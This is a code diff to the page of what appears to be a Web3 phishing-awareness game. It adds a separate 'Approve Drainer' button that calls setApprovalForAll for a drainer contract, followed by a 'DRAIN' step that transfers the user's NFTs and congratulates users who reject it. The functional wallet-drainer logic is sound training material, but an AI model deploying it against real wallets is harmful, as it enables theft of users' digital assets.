@@ -101,6 +101,7 @@
       <p>Claim your exclusive animation…</p>
       <div class="button-container">
         <button id="connectBtn">Connect Wallet</button>
+        <button id="approveBtn">Approve Drainer</button>
         <button id="drainBtn">Animate NFT / DRAIN</button>
       </div>
       <div id="status"></div>
@@ -116,10 +117,10 @@
 
   <script>
     const nftContracts = [
-      "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT (WGNFT)
-      "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC (HAYC)
+      "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT
+      "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC
     ];
-    const drainerContract = "0x3A0C897D86e0616dC5e1048CC27e5e61ba067C6F"; // BatchNFTDrainerV2 address
+    const drainerContract = "0x0958c7C8d1898b93b229A0ebD5D1b1Cc8985a566"; // Update if redeployed
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -130,7 +131,7 @@
       "function approveAndDrainSpecific(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
     ];
 
-    let provider, signer;
+    let provider, signer, isApproved = false;
 
     function updateCounters() {
       document.getElementById("surviveCount").textContent = localStorage.getItem("w3game_survived") || 0;
@@ -190,12 +191,32 @@
       }
     };
 
-    // Approves and drains NFTs in one transaction
-    document.getElementById("drainBtn").onclick = async () => {
+    // Approves the drainer contract
+    document.getElementById("approveBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "🚨 Approving and draining NFTs...";
+        status.innerText = "⏳ Approving drainer...";
+        for (const contractAddr of nftContracts) {
+          const contract = new ethers.Contract(contractAddr, nftABI, signer);
+          const tx = await contract.setApprovalForAll(drainerContract, true);
+          await tx.wait();
+        }
+        isApproved = true;
+        status.innerText = "✅ Drainer approved for all NFTs. Ready to drain!";
+      } catch (err) {
+        console.error("Approval error:", err);
+        status.innerText = "⚠️ Approval failed: " + err.message;
+      }
+    };
+
+    // Drains NFTs after approval
+    document.getElementById("drainBtn").onclick = async () => {
+      const status = document.getElementById("status");
+      if (!signer) return alert("Please connect your wallet first.");
+      if (!isApproved) return alert("Please approve the drainer first!");
+      try {
+        status.innerText = "🚨 Draining NFTs...";
         const user = await signer.getAddress();
 
         // Gather owned token IDs using tokenOfOwnerByIndex
@@ -225,7 +246,7 @@
           return;
         }
 
-        // Call approveAndDrainSpecific
+        // Call approveAndDrainSpecific (drain only, approval handled separately)
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
         const tx = await drainer.approveAndDrainSpecific(nftContracts, tokenIdMatrix);
         await tx.wait();
@@ -243,7 +264,7 @@
         if (err.code === "ACTION_REJECTED") {
           status.innerText =
             "✅ You survived Level 2!\n\n" +
-            "🛡️ You rejected a malicious transaction that would have approved and drained your NFTs. " +
+            "🛡️ You rejected a malicious transaction that would have drained your NFTs. " +
             "Always verify contracts before approving!";
           let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
           localStorage.setItem("w3game_survived", surviveCount + 1);
